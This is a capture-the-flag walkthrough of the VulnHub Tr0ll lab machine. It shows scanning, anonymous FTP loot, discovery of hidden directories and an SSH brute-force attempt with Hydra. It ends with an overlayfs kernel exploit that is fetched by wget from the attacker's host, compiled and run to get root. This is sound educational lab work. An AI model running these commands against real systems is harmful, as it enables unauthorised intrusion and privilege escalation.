# Tr0ll | VulnHub
https://www.vulnhub.com/entry/tr0ll-1,100/

### 1. Scan
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -A -p- -T4 192.168.34.152
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 23:54 EST
Nmap scan report for 192.168.34.152
Host is up (0.0013s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.34.141
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:A8:A8:79 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.27 ms 192.168.34.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.11 seconds
```
The machine is running SSH, FTP and an Apache HTTP server.

### 2. Look at FTP files
Through anonymous access I can get a lol.pcap file.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 192.168.34.152
Connected to 192.168.34.152.
220 (vsFTPd 3.0.2)
Name (192.168.34.152:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap
226 Directory send OK.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
ftp> exit
221 Goodbye.
```
The lol.pcap contains the following TCP stream:
```
220 (vsFTPd 3.0.2)
USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,0,12,202,172
200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,0,12,172,74
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
QUIT
221 Goodbye.
```
The data of this file is also shown in the capture as follows:  
*Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
Sucks, you were so close... gotta TRY HARDER!*

### 3. Look at the website
The website is serving a trollface picture on the index. There is also a secret directory with another trollface. I can look in /sup3rs3cr3tdirlol, which is a listable directory and contains one file called "roflmao". I can download this file and take a look.
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ file roflmao  
roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped

┌──(kali㉿kali)-[~/Downloads]
└─$ ./roflmao
Find address 0x0856BF to proceed
```
After some further examination in disassembly tools, there is no other functionlity to this binary file. It doesn't accept user input - it literally just prints this static string and exits. Knowing this, go back and search for more directories, this time including 0x0856BF. This results in another listable directory being discovered at: /0x0856BF.
  
In this listable directory there are two folders: "good_luck" and "this_folder_contains_the_password/", both have only one text file inside. "good_luck" contains what looks to be a list of usernames:
```
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```
The password text file contains only a single line:
```
Good_job_:)
```
The only service I have to try these credentials with is SSH.

### 4. Try to attack SSH
The some reason SSH keeps dropping out and refusing connections as I try each user:pass combination, so this part I had to skip over unfortunately.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -L users.txt -P passwords.txt -t 2 -w 15 192.168.34.152 ssh -v                                                                                                                                                                                    255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-13 20:10:27
[DATA] max 2 tasks per 1 server, overall 2 tasks, 20 login tries (l:10/p:2), ~10 tries per task
[DATA] attacking ssh://192.168.34.152:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://maleus@192.168.34.152:22
[INFO] Successful, password authentication is supported by ssh://192.168.34.152:22
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 1
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 1
[ERROR] could not connect to target port 22: Connection refused
...
```
I had to ask someone if SSH plays nice you find the valid login creds to be `overflow:Pass.txt`. This gets me a shell after some more failed connection attempts.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh overflow@192.168.34.152                                                                                                                                                                                                                             255 ⨯
ssh: connect to host 192.168.34.152 port 22: Connection refused
                                                                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh overflow@192.168.34.152                                                                                                                                                                                                                             255 ⨯
ssh: connect to host 192.168.34.152 port 22: Connection refused
                                                                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh overflow@192.168.34.152                                                                                                                                                                                                                             255 ⨯
ssh: connect to host 192.168.34.152 port 22: Connection refused
                                                                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh overflow@192.168.34.152                                                                                                                                                                                                                             255 ⨯
overflow@192.168.34.152's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```

### 5. Enumeration
Enumeration is tricky on this machine as you get periodically kicked off.
```bash
overflow@troll:/var/www/html$ ls
0x0856BF  hacker.jpg  index.html  robots.txt  secret  sup3rs3cr3tdirlol
                                                                               
Broadcast Message from root@trol                                               
        (somewhere) at 17:15 ...                                               
                                                                               
TIMES UP LOL!                                                                  
                                                                               
Connection to 192.168.34.152 closed by remote host.
Connection to 192.168.34.152 closed.
```
Operating system details:
```bash
overflow@troll:/$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"

overflow@troll:/$ cat /proc/version
Linux version 3.13.0-32-generic (buildd@roseapple) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014
```
This OS and kernel version is pretty old now, so there should be vulnerabilities for privesc.

### 6. Escalate to root
References:
- https://www.exploit-db.com/exploits/37292
- https://ubuntu.com/security/CVE-2015-1328

The overlayfs local privilege escalation exploit for kernel versions before 13.19, exploits a lack of restrictions on file creation on upper overlayfs namespaces, allowing a user to leverage and get command execution as the root user. It is known to be pretty reliable, however due to the age of this kernel, there probably exists more paths to root beyond this.

```bash
overflow@troll:/tmp$ wget http://192.168.34.141:8000/37292.c
--2021-03-13 17:26:21--  http://192.168.34.141:8000/37292.c
Connecting to 192.168.34.141:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: ‘37292.c’

100%[========================================================================================================================================================================================================================>] 5,119       --.-K/s   in 0s      

2021-03-13 17:26:21 (331 MB/s) - ‘37292.c’ saved [5119/5119]

overflow@troll:/tmp$ gcc 37292.c -o giveroot
overflow@troll:/tmp$ ./giveroot
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
```